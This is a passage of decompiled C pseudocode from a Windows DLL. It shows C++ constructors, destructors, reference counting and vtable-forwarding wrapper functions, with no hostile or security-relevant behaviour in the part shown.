  (*(void (__thiscall **)(int, int))(*(_DWORD *)a1 + 24))(a1, 100);
  return a2;
}
// 10102434: using guessed type int (__thiscall *off_10102434)(void *Block, char);

//----- (1000ED85) --------------------------------------------------------
_DWORD **__thiscall sub_1000ED85(_DWORD **Block, char a2)
{
  sub_1000EDA4(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000EDA4) --------------------------------------------------------
int __thiscall sub_1000EDA4(_DWORD **this)
{
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  *this = &off_10102434;
  v2[6] = 0;
  return sub_1000EC84(this[1]);
}
// 10102434: using guessed type int (__thiscall *off_10102434)(void *Block, char);

//----- (1000EDE4) --------------------------------------------------------
_DWORD *__usercall sub_1000EDE4@<eax>(int *a1@<eax>, _DWORD *a2@<edi>)
{
  *a2 = &off_10102434;
  a2[1] = a1;
  sub_1000ECB1(a1);
  return a2;
}
// 10102434: using guessed type int (__thiscall *off_10102434)(void *Block, char);

//----- (1000EDF9) --------------------------------------------------------
void __cdecl __noreturn sub_1000EDF9(int pExceptionObject)
{
  sub_1001E589(&pExceptionObject, pExceptionObject);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__);
}

//----- (1000EE19) --------------------------------------------------------
_DWORD *__thiscall sub_1000EE19(_DWORD *this, int a2)
{
  sub_1000E7B3(this, a2);
  *this = &off_10102A68;
  return this;
}
// 10102A68: using guessed type int (__thiscall *off_10102A68)(void *Block, char);

//----- (1000EE51) --------------------------------------------------------
_DWORD *__stdcall sub_1000EE51(_DWORD *a1, void *Block, int a3, volatile LONG *lpAddend, int a5, volatile LONG *a6)
{
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  volatile LONG *v8; // eax
  int v9; // ecx
  int v10; // ecx
  volatile LONG *v12; // [esp-4h] [ebp-1Ch]

  *a1 = off_10102438;
  a1[1] = Block;
  v6 = operator new(4u);
  if ( v6 )
    *v6 = 1;
  else
    v6 = 0;
  a1[3] = v6;
  a1[2] = 0;
  v7 = operator new(4u);
  if ( v7 )
    *v7 = 1;
  else
    v7 = 0;
  a1[5] = v7;
  a1[4] = 0;
  v8 = lpAddend;
  v9 = a3;
  a1[6] = 0;
  a1[7] = 0;
  a1[9] = v8;
  a1[8] = v9;
  InterlockedIncrement(v8);
  v10 = a5;
  v12 = a6;
  a1[11] = a6;
  a1[10] = v10;
  InterlockedIncrement(v12);
  sub_1002228F((void **)&a3);
  sub_1002228F((void **)&a5);
  return a1;
}
// 10102438: using guessed type int (*off_10102438[2])();

//----- (1000EF1B) --------------------------------------------------------
void **__thiscall sub_1000EF1B(void **this, char a2)
{
  sub_1002228F(this + 10);
  sub_1002228F(this + 8);
  sub_10020B81(this + 4);
  sub_10020B81(this + 2);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (1000EF7D) --------------------------------------------------------
int __thiscall sub_1000EF7D(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v2 = (***(int (__thiscall ****)(_DWORD))(this + 4))(*(_DWORD *)(this + 4));
  if ( v2 != *(_DWORD *)(this + 24) )
  {
    *(_DWORD *)(this + 24) = v2;
    v3 = operator new(0x28u);
    if ( v3 )
      v4 = sub_10015DB2(*(void **)(this + 24), v3, *(_DWORD *)(this + 40));
    else
      v4 = 0;
    sub_100572CC((_DWORD *)(this + 8), (int)v4);
  }
  return *(_DWORD *)(this + 8);
}

//----- (1000EFDD) --------------------------------------------------------
int __thiscall sub_1000EFDD(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v2 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 != *(_DWORD *)(this + 28) )
  {
    *(_DWORD *)(this + 28) = v2;
    v3 = operator new(0x3Cu);
    if ( v3 )
      v4 = sub_10015F9A(*(void **)(this + 28), v3, *(_DWORD *)(this + 32));
    else
      v4 = 0;
    sub_100572CC((_DWORD *)(this + 16), (int)v4);
  }
  return *(_DWORD *)(this + 16);
}

//----- (1000F056) --------------------------------------------------------
int __thiscall sub_1000F056(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 20))(this[1]);
}

//----- (1000F062) --------------------------------------------------------
int __thiscall sub_1000F062(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 24))(this[1]);
}

//----- (1000F06A) --------------------------------------------------------
int __thiscall sub_1000F06A(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 28))(this[1]);
}

//----- (1000F076) --------------------------------------------------------
int __thiscall sub_1000F076(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 32))(this[1]);
}

//----- (1000F07E) --------------------------------------------------------
int __thiscall sub_1000F07E(_DWORD **this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(*this[1] + 36))(this[1], a2);
  return a2;
}

//----- (1000F0B4) --------------------------------------------------------
_DWORD *__cdecl sub_1000F0B4(_DWORD *a1, void *a2)
{
  _DWORD *v2; // esi
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  volatile LONG *v5; // ecx
  _DWORD *v6; // edi
  volatile LONG *v7; // ecx
  _DWORD *v8; // eax
  volatile LONG *v10; // [esp-10h] [ebp-38h] BYREF
  volatile LONG *v11; // [esp-Ch] [ebp-34h]
  volatile LONG *v12; // [esp-8h] [ebp-30h] BYREF
  volatile LONG *v13; // [esp-4h] [ebp-2Ch]
  void *v14; // [esp+Ch] [ebp-1Ch]
  void *v15; // [esp+10h] [ebp-18h]
  int v16; // [esp+14h] [ebp-14h]
  void *Block; // [esp+18h] [ebp-10h]
  int v18; // [esp+24h] [ebp-4h]

  v2 = 0;
  v16 = 0;
  Block = operator new(0x30u);
  v18 = 1;
  if ( Block )
  {
    v3 = operator new(0x30u);
    v15 = v3;
    LOBYTE(v18) = 2;
    if ( v3 )
      v2 = sub_10016198(dword_10186904, v3);
    v4 = operator new(0x30u);
    v5 = v13;
    v15 = v4;
    LOBYTE(v18) = 3;
    if ( v4 )
      v6 = sub_10016198(dword_10186904, v4);
    else
      v6 = 0;
    LOBYTE(v18) = 1;
    v13 = v5;
    v12 = v5;
    v15 = &v12;
    sub_10050B91(&v12, v2 != 0 ? (unsigned int)(v2 + 1) : 0);
    LOBYTE(v18) = 4;
    v11 = v7;
    v10 = v7;
    v14 = &v10;
    sub_10050B91(&v10, (int)v6);
    LOBYTE(v18) = 1;
    v2 = sub_1000EE51(Block, a2, (int)v10, v11, (int)v12, v13);
  }
  LOBYTE(v18) = 0;
  v8 = operator new(4u);
  v14 = v8;
  v18 = 6;
  if ( v8 )
    *v8 = 1;
  else
    v8 = 0;
  a1[1] = v8;
  *a1 = v2;
  return a1;
}
// 1000F132: variable 'v5' is possibly undefined
// 1000F147: variable 'v7' is possibly undefined
// 10186904: using guessed type _DWORD dword_10186904[5];

//----- (1000F1AC) --------------------------------------------------------
void __thiscall sub_1000F1AC(_BYTE *this)
{
  this[13] = 1;
}

//----- (1000F1B1) --------------------------------------------------------
int __stdcall sub_1000F1B1(int a1, int a2, volatile LONG *lpAddend, int a4, int a5)
{
  volatile LONG *v5; // eax
  int v6; // ecx
  _DWORD *v7; // eax
  int v9[2]; // [esp+Ch] [ebp-18h] BYREF
  int v10; // [esp+14h] [ebp-10h]
  int v11; // [esp+20h] [ebp-4h]

  v10 = 0;
  v11 = 1;
  v5 = lpAddend;
  *(_DWORD *)(a1 + 4) = 0;
  *(_DWORD *)(a1 + 8) = -1;
  v6 = a2;
  *(_BYTE *)(a1 + 12) = 0;
  *(_BYTE *)(a1 + 13) = 0;
  *(_BYTE *)(a1 + 14) = 0;
  *(_DWORD *)a1 = &off_10102468;
  *(_DWORD *)(a1 + 20) = v5;
  *(_DWORD *)(a1 + 16) = v6;
  InterlockedIncrement(v5);
  sub_1000D372((_DWORD *)(a1 + 24), (int)&a4);
  LOBYTE(v11) = 3;
  if ( sub_1000D65C((int)&unk_10186920, (int)&a4) )
  {
    v7 = sub_1000D5FF(v9, (int)&a4, dword_10186918);
    LOBYTE(v11) = 4;
    v10 = 1;
  }
  else
  {
    v7 = &unk_10186920;
  }
  sub_1000D372((_DWORD *)(a1 + 32), (int)v7);
  v11 = 6;
  if ( (v10 & 1) != 0 )
  {
    v10 &= ~1u;
    sub_1000D3AD(v9);
  }
  LOBYTE(v11) = 0;
  sub_10007D7A((void **)&a2);
  v11 = -1;
  sub_1000D3AD(&a4);
  return a1;
}
// 10102468: using guessed type int (__stdcall *off_10102468)(char);
// 10186918: using guessed type _DWORD dword_10186918[2];

//----- (1000F290) --------------------------------------------------------
int __thiscall sub_1000F290(int this, char a2)
{
  sub_1000D3AD((int *)(this + 32));
  sub_1000D3AD((int *)(this + 24));
  sub_10007D7A((void **)(this + 16));
  if ( (a2 & 1) != 0 )
    j__free((void *)this);
  return this;
}

//----- (1000F2E6) --------------------------------------------------------
_DWORD *__fastcall sub_1000F2E6(_DWORD *a1, int a2, _DWORD *a3)
{
  _DWORD *v3; // eax
  int v5[2]; // [esp+4h] [ebp-18h] BYREF
  int v6; // [esp+Ch] [ebp-10h]
  int v7; // [esp+18h] [ebp-4h]

  v6 = 0;
  if ( *(_DWORD *)(a1[1] + 28) )
  {
    v3 = sub_1000D5FF(v5, a2 + 32, a1);
    v7 = 1;
    v6 = 1;
  }
  else
  {
    v3 = (_DWORD *)(a2 + 24);
  }
  sub_1000D372(a3, (int)v3);
  v6 |= 2u;
  v7 = 0;
  if ( (v6 & 1) != 0 )
  {
    v6 &= ~1u;
    sub_1000D3AD(v5);
  }
  return a3;
}

//----- (1000F355) --------------------------------------------------------
void __thiscall sub_1000F355(_DWORD *this, _DWORD *a2, int a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v5[2]; // [esp+4h] [ebp-14h] BYREF
  int v6; // [esp+14h] [ebp-4h]

  v3 = this[4];
  v4 = sub_1000F2E6(a2, (int)this, v5);
  v6 = 0;
  (*(void (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v3 + 28))(v3, v4, a3);
  v6 = -1;
  sub_1000D3AD(v5);
}

//----- (1000F39D) --------------------------------------------------------
void __thiscall sub_1000F39D(_DWORD *this, _DWORD *a2, int a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v5[2]; // [esp+4h] [ebp-14h] BYREF
  int v6; // [esp+14h] [ebp-4h]

  v3 = this[4];
  v4 = sub_1000F2E6(a2, (int)this, v5);
  v6 = 0;
  (*(void (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v3 + 32))(v3, v4, a3);
  v6 = -1;
  sub_1000D3AD(v5);
}

//----- (1000F3E5) --------------------------------------------------------
void __thiscall sub_1000F3E5(_DWORD *this, _DWORD *a2, int a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v5[2]; // [esp+4h] [ebp-14h] BYREF
  int v6; // [esp+14h] [ebp-4h]

  v3 = this[4];
  v4 = sub_1000F2E6(a2, (int)this, v5);
  v6 = 0;
  (*(void (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v3 + 36))(v3, v4, a3);
  v6 = -1;
  sub_1000D3AD(v5);
}

//----- (1000F42D) --------------------------------------------------------
void __thiscall sub_1000F42D(_DWORD *this, _DWORD *a2, int a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v5[2]; // [esp+4h] [ebp-14h] BYREF
  int v6; // [esp+14h] [ebp-4h]

  v3 = this[4];
  v4 = sub_1000F2E6(a2, (int)this, v5);
  v6 = 0;
  (*(void (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v3 + 40))(v3, v4, a3);
  v6 = -1;
  sub_1000D3AD(v5);
}

//----- (1000F475) --------------------------------------------------------
void __thiscall sub_1000F475(_DWORD *this, _DWORD *a2, int a3, int a4)
{
  int *v5; // esi
  _DWORD *v6; // eax
  int v7; // edx
  _DWORD *v8; // [esp-8h] [ebp-28h] BYREF
  _DWORD *v9; // [esp-4h] [ebp-24h]
  int v10[3]; // [esp+8h] [ebp-18h] BYREF
  int v11; // [esp+1Ch] [ebp-4h]

  v11 = 0;
  v5 = (int *)this[4];
  v9 = this;
  v8 = this;
  v10[2] = (int)&v8;
  sub_1000D372(&v8, (int)&a3);
  LOBYTE(v11) = 1;
  v6 = sub_1000F2E6(a2, (int)this, v10);
  LOBYTE(v11) = 2;
  v7 = *v5;
  LOBYTE(v11) = 3;
  (*(void (__thiscall **)(int *, _DWORD *, _DWORD *, _DWORD *))(v7 + 44))(v5, v6, v8, v9);
  LOBYTE(v11) = 0;
  sub_1000D3AD(v10);
  v11 = -1;
  sub_1000D3AD(&a3);
}

//----- (1000F4E8) --------------------------------------------------------
void __thiscall sub_1000F4E8(_DWORD *this, _DWORD *a2, double a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v5[2]; // [esp+Ch] [ebp-14h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v3 = this[4];
  v4 = sub_1000F2E6(a2, (int)this, v5);
  v6 = 0;
  (*(void (__thiscall **)(int, _DWORD *, _DWORD, _DWORD))(*(_DWORD *)v3 + 48))(v3, v4, LODWORD(a3), HIDWORD(a3));
  v6 = -1;
  sub_1000D3AD(v5);
}

//----- (1000F535) --------------------------------------------------------
void __thiscall sub_1000F535(_DWORD *this, _DWORD *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8)
{
  int *v9; // esi
  _DWORD *v10; // eax
  int v11; // edx
  _DWORD v12[5]; // [esp-18h] [ebp-38h] BYREF
  void *v13; // [esp-4h] [ebp-24h]
  int v14[2]; // [esp+Ch] [ebp-14h] BYREF
  int v15; // [esp+1Ch] [ebp-4h]

  v15 = 0;
  v13 = a8;
  v9 = (int *)this[4];
  a8 = v12;
  sub_1000B36F(&a3, (int)v12);
  LOBYTE(v15) = 1;
  v10 = sub_1000F2E6(a2, (int)this, v14);
  LOBYTE(v15) = 2;
  v11 = *v9;
  LOBYTE(v15) = 3;
  (*(void (__thiscall **)(int *, _DWORD *, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, void *))(v11 + 52))(
    v9,
    v10,
    v12[0],
    v12[1],
    v12[2],
    v12[3],
    v12[4],
    v13);
  LOBYTE(v15) = 0;
  sub_1000D3AD(v14);
  v15 = -1;
  sub_1000B3DF(&a3);
}

//----- (1000F5AB) --------------------------------------------------------
void __thiscall sub_1000F5AB(_DWORD *this, _DWORD *a2, int a3, int a4, int a5, int a6, int a7)
{
  int *v8; // esi
  _DWORD *v9; // eax
  int v10; // edx
  _DWORD v11[8]; // [esp-14h] [ebp-38h] BYREF
  int v12[3]; // [esp+Ch] [ebp-18h] BYREF
  int v13; // [esp+20h] [ebp-4h]

  v13 = 0;
  v8 = (int *)this[4];
  v12[2] = (int)v11;
  sub_1000B36F(&a3, (int)v11);
  LOBYTE(v13) = 1;
  v9 = sub_1000F2E6(a2, (int)this, v12);
  LOBYTE(v13) = 2;
  v10 = *v8;
  LOBYTE(v13) = 3;
  (*(void (__thiscall **)(int *, _DWORD *, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(v10 + 56))(
    v8,
    v9,
    v11[0],
    v11[1],
    v11[2],
    v11[3],
    v11[4]);
  LOBYTE(v13) = 0;
  sub_1000D3AD(v12);
  v13 = -1;
  sub_1000B3DF(&a3);
}

//----- (1000F61F) --------------------------------------------------------
char __thiscall sub_1000F61F(_DWORD *this, _DWORD *a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  char v4; // bl
  int v6[2]; // [esp+8h] [ebp-14h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  v2 = this[4];
  v3 = sub_1000F2E6(a2, (int)this, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 60))(v2, v3);
  v7 = -1;
  sub_1000D3AD(v6);
  return v4;
}

//----- (1000F66A) --------------------------------------------------------
char __thiscall sub_1000F66A(_DWORD *this, _DWORD *a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  char v4; // bl
  int v6[2]; // [esp+8h] [ebp-14h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  v2 = this[4];
  v3 = sub_1000F2E6(a2, (int)this, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 64))(v2, v3);
  v7 = -1;
  sub_1000D3AD(v6);
  return v4;
}

//----- (1000F6B5) --------------------------------------------------------
__int16 __thiscall sub_1000F6B5(_DWORD *this, _DWORD *a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  int v5[2]; // [esp+4h] [ebp-14h] BYREF
  int v6; // [esp+14h] [ebp-4h]

  v2 = this[4];
  v3 = sub_1000F2E6(a2, (int)this, v5);
  v6 = 0;
  LOWORD(v2) = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 68))(v2, v3);
  v6 = -1;
  sub_1000D3AD(v5);
  return v2;
}

//----- (1000F700) --------------------------------------------------------
int __thiscall sub_1000F700(_DWORD *this, _DWORD *a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  int v4; // esi
  int v6[2]; // [esp+4h] [ebp-14h] BYREF
  int v7; // [esp+14h] [ebp-4h]

  v2 = this[4];
  v3 = sub_1000F2E6(a2, (int)this, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 72))(v2, v3);
  v7 = -1;
  sub_1000D3AD(v6);
  return v4;
}

//----- (1000F749) --------------------------------------------------------
void *__thiscall sub_1000F749(_DWORD *this, void *a2, _DWORD *a3, int a4)
{
  int v4; // esi
  _DWORD *v5; // eax
  int v7[2]; // [esp+8h] [ebp-18h] BYREF
  int v8; // [esp+10h] [ebp-10h]
  int v9; // [esp+1Ch] [ebp-4h]

  v8 = 0;
  v4 = this[4];
  v5 = sub_1000F2E6(a3, (int)this, v7);
  v9 = 1;
  (*(void (__thiscall **)(int, void *, _DWORD *, int))(*(_DWORD *)v4 + 76))(v4, a2, v5, a4);
  v8 = 1;
  LOBYTE(v9) = 0;
  sub_1000D3AD(v7);
  return a2;
}

//----- (1000F7A3) --------------------------------------------------------
int __thiscall sub_1000F7A3(_DWORD *this, int a2, _DWORD *a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v6[2]; // [esp+8h] [ebp-18h] BYREF
  int v7; // [esp+10h] [ebp-10h]
  int v8; // [esp+1Ch] [ebp-4h]

  v7 = 0;
  v3 = this[4];
  v4 = sub_1000F2E6(a3, (int)this, v6);
  v8 = 1;
  (*(void (__thiscall **)(int, int, _DWORD *))(*(_DWORD *)v3 + 80))(v3, a2, v4);
  v7 = 1;
  LOBYTE(v8) = 0;
  sub_1000D3AD(v6);
  return a2;
}

//----- (1000F7FA) --------------------------------------------------------
void *__thiscall sub_1000F7FA(_DWORD *this, void *a2, _DWORD *a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v6[2]; // [esp+8h] [ebp-18h] BYREF
  int v7; // [esp+10h] [ebp-10h]
  int v8; // [esp+1Ch] [ebp-4h]

  v7 = 0;
  v3 = this[4];
  v4 = sub_1000F2E6(a3, (int)this, v6);
  v8 = 1;
  (*(void (__thiscall **)(int, void *, _DWORD *))(*(_DWORD *)v3 + 84))(v3, a2, v4);
  v7 = 1;
  LOBYTE(v8) = 0;
  sub_1000D3AD(v6);
  return a2;
}

//----- (1000F851) --------------------------------------------------------
double __thiscall sub_1000F851(_DWORD *this, _DWORD *a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  double v5; // [esp+4h] [ebp-1Ch]
  int v6[2]; // [esp+Ch] [ebp-14h] BYREF
  int v7; // [esp+1Ch] [ebp-4h]

  v2 = this[4];
  v3 = sub_1000F2E6(a2, (int)this, v6);
  v7 = 0;
  v5 = ((double (__thiscall *)(int, _DWORD *))*(_DWORD *)(*(_DWORD *)v2 + 88))(v2, v3);
  v7 = -1;
  sub_1000D3AD(v6);
  return v5;
}

//----- (1000F89D) --------------------------------------------------------
int __thiscall sub_1000F89D(_DWORD *this, _DWORD *a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  int v4; // esi
  int v6[2]; // [esp+4h] [ebp-14h] BYREF
  int v7; // [esp+14h] [ebp-4h]

  v2 = this[4];
  v3 = sub_1000F2E6(a2, (int)this, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 92))(v2, v3);
  v7 = -1;
  sub_1000D3AD(v6);
  return v4;
}

//----- (1000F8E6) --------------------------------------------------------
char __thiscall sub_1000F8E6(_DWORD *this, _DWORD *a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  char v4; // bl
  int v6[2]; // [esp+8h] [ebp-14h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  v2 = this[4];
  v3 = sub_1000F2E6(a2, (int)this, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 96))(v2, v3);
  v7 = -1;
  sub_1000D3AD(v6);
  return v4;
}

//----- (1000F931) --------------------------------------------------------
void __thiscall sub_1000F931(_DWORD *this, _DWORD *a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  v2 = this[4];
  v3 = sub_1000F2E6(a2, (int)this, v4);
  v5 = 0;
  (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 100))(v2, v3);
  v5 = -1;
  sub_1000D3AD(v4);
}

//----- (1000F976) --------------------------------------------------------
_DWORD *__thiscall sub_1000F976(_DWORD *this, _DWORD *a2, _DWORD *a3)
{
  int v4; // ebx
  _DWORD *v5; // eax
  unsigned int v6; // edi
  unsigned int i; // ebx
  int v8; // eax
  int v9; // eax
  int v11[2]; // [esp+Ch] [ebp-20h] BYREF
  int v12[2]; // [esp+14h] [ebp-18h] BYREF
  int v13; // [esp+1Ch] [ebp-10h]
  int v14; // [esp+28h] [ebp-4h]
  _DWORD *v15; // [esp+38h] [ebp+Ch]

  v14 = 0;
  v13 = 0;
  v4 = this[4];
  v5 = sub_1000F2E6(a3, (int)this, v12);
  v14 = 1;
  (*(void (__thiscall **)(int, _DWORD *, _DWORD *))(*(_DWORD *)v4 + 104))(v4, a2, v5);
  v13 = 1;
  LOBYTE(v14) = 0;
  sub_1000D3AD(v12);
  v6 = *(_DWORD *)(this[9] + 28);
  for ( i = 0; i < a2[1]; ++i )
  {
    v8 = (*(int (__thiscall **)(_DWORD *, unsigned int))(*a2 + 44))(a2, i);
    sub_1000D372(v12, v8);
    v14 = 2;
    v15 = sub_1000D836(-2, (int)v12, v11, v6);
    LOBYTE(v14) = 3;
    v9 = (*(int (__thiscall **)(_DWORD *, unsigned int))(*a2 + 44))(a2, i);
    sub_10001236(v15 + 1, (LONG *)(v9 + 4));
    LOBYTE(v14) = 2;
    sub_1000D3AD(v11);
    LOBYTE(v14) = 0;
    sub_1000D3AD(v12);
  }
  return a2;
}

//----- (1000FA4D) --------------------------------------------------------
char __thiscall sub_1000FA4D(int **this)
{
  return sub_1000ECB1(this[4]);
}

//----- (1000FA58) --------------------------------------------------------
int __thiscall sub_1000FA58(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[4] + 108))(this[4]);
}

//----- (1000FA60) --------------------------------------------------------
_DWORD *__thiscall sub_1000FA60(_DWORD *this, _DWORD *a2, int a3)
{
  _DWORD *v3; // edi
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int v7[2]; // [esp+Ch] [ebp-20h] BYREF
  int v8[2]; // [esp+14h] [ebp-18h] BYREF
  int v9; // [esp+1Ch] [ebp-10h]
  int v10; // [esp+28h] [ebp-4h]

  v9 = 0;
  v3 = this + 6;
  if ( sub_1000D65C((int)&unk_10186920, (int)(this + 6)) )
  {
    v4 = sub_1000D5FF(v7, (int)dword_10186918, v3);
    v10 = 1;
    v9 = 1;
  }
  else
  {
    v4 = &unk_10186920;
  }
  sub_1000D372(v8, (int)v4);
  v10 = 3;
  if ( (v9 & 1) != 0 )
  {
    v9 &= ~1u;
    sub_1000D3AD(v7);
  }
  if ( *(_DWORD *)(*(_DWORD *)(a3 + 4) + 28) )
  {
    v5 = sub_1000D5FF(v7, a3, v8);
    LOBYTE(v10) = 4;
    v9 |= 2u;
  }
  else
  {
    v5 = v3;
  }
  sub_1000D372(a2, (int)v5);
  v9 |= 4u;
  v10 = 3;
  if ( (v9 & 2) != 0 )
  {
    v9 &= ~2u;
    sub_1000D3AD(v7);
  }
  LOBYTE(v10) = 0;
  sub_1000D3AD(v8);
  return a2;
}
// 10186918: using guessed type _DWORD dword_10186918[2];

//----- (1000FB37) --------------------------------------------------------
_DWORD *__thiscall sub_1000FB37(int this, _DWORD *a2)
{
  int v3; // eax
  int v5[2]; // [esp+8h] [ebp-18h] BYREF
  int v6; // [esp+10h] [ebp-10h]
  int v7; // [esp+1Ch] [ebp-4h]

  v6 = 0;
  v3 = (*(int (__thiscall **)(_DWORD, int *))(**(_DWORD **)(this + 16) + 112))(*(_DWORD *)(this + 16), v5);
  v7 = 1;
  sub_1000FA60((_DWORD *)this, a2, v3);
  v6 = 1;
  LOBYTE(v7) = 0;
  sub_1000D3AD(v5);
  return a2;
}

//----- (1000FB8B) --------------------------------------------------------
int __stdcall sub_1000FB8B(int a1, void *a2)
{
  int v2; // eax
  int v3; // ecx
  int v5; // [esp-8h] [ebp-30h] BYREF
  int v6; // [esp-4h] [ebp-2Ch]
  int v7[3]; // [esp+10h] [ebp-18h] BYREF
  int v8; // [esp+24h] [ebp-4h]

  v6 = (int)a2;
  *(_DWORD *)(a1 + 8) = -1;
  v5 = a1 + 16;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 12) = 0;
  *(_BYTE *)(a1 + 13) = 0;
  *(_BYTE *)(a1 + 14) = 0;
  *(_DWORD *)a1 = &off_101024E8;
  sub_1001684C(v5, v6);
  v8 = 1;
  sub_10050B91((_DWORD *)(a1 + 76), 0);
  *(_DWORD *)(a1 + 84) = 0;
  *(_DWORD *)(a1 + 88) = 0;
  v2 = (*(int (__thiscall **)(void *, int *))(*(_DWORD *)a2 + 36))(a2, v7);
  LOBYTE(v8) = 2;
  v6 = v3;
  v5 = v3;
  sub_1000D5FF(&v5, v2, dword_101868B4);
  LOBYTE(v8) = 2;
  sub_10017256((_DWORD *)(a1 + 92), 0, v5, v6);
  LOBYTE(v8) = 5;
  sub_1000D3AD(v7);
  return a1;
}
// 1000FBE8: variable 'v3' is possibly undefined
// 101024E8: using guessed type int (__stdcall *off_101024E8)(char);
// 101868B4: using guessed type _DWORD dword_101868B4[2];
// 1000FB8B: using guessed type int var_18[3];

//----- (1000FC33) --------------------------------------------------------
_DWORD *__thiscall sub_1000FC33(_DWORD *this, char a2)
{
  sub_100172D3(this + 23);
  sub_10007846((int)(this + 19));
  sub_1001690F((int)(this + 4));
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (1000FC8A) --------------------------------------------------------
int __thiscall sub_1000FC8A(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[8] + 24))(this[8]);
}

//----- (1000FC92) --------------------------------------------------------
void *__thiscall sub_1000FC92(void *this, void *a2)
{
  sub_10017180((int)this + 16, a2);
  return a2;
}

//----- (1000FCC9) --------------------------------------------------------
void __stdcall sub_1000FCC9(_DWORD *a1, int a2, int a3)
{
  _DWORD *v3; // eax
  int v4; // [esp+0h] [ebp-14h] BYREF
  int v5; // [esp+10h] [ebp-4h]

  v5 = 0;
  if ( *a1 != a3 )
  {
    v3 = sub_1000FD12(&v4, 1);
    LOBYTE(v5) = 1;
    sub_10010D0C((int)v3);
  }
  sub_10008301((void **)&a1);
}

//----- (1000FD12) --------------------------------------------------------
_DWORD *__stdcall sub_1000FD12(_DWORD *a1, int a2)
{
  if ( a2 )
  {
    *a1 = &unk_10102930;
    sub_1000E7F7(a1 + 1, 1, 0);
  }
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_101022EC;
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_101024E0;
  return a1;
}
// 101022EC: using guessed type int (__stdcall *off_101022EC)(char);
// 101024E0: using guessed type int (__stdcall *off_101024E0)(char);

//----- (1000FD78) --------------------------------------------------------
void __thiscall sub_1000FD78(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 1;
  sub_1000FDB7((int)(this + 1));
  sub_1000E843(v1);
}

//----- (1000FD8A) --------------------------------------------------------
_DWORD *__thiscall sub_1000FD8A(_DWORD *this, char a2)
{
  _DWORD *v2; // esi

  v2 = this - 1;
  sub_1000FDB7((int)this);
  sub_1000E843(this);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1000FDB7) --------------------------------------------------------
int __stdcall sub_1000FDB7(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a1 - 4) + 4) + a1 - 4) = &off_101022EC;
  return result;
}
// 101022EC: using guessed type int (__stdcall *off_101022EC)(char);

//----- (1000FDE4) --------------------------------------------------------
void __thiscall sub_1000FDE4(void *this, int a2, int a3)
{
  _DWORD *v3; // eax
  void *v4; // [esp+0h] [ebp-10h] BYREF
  int v5; // [esp+Ch] [ebp-4h]

  v4 = this;
  v5 = 0;
  if ( !a2 )
  {
    v3 = sub_1000E8EF(&v4);
    LOBYTE(v5) = 1;
    sub_100078FE((int)v3);
  }
  sub_10008301((void **)&a2);
}

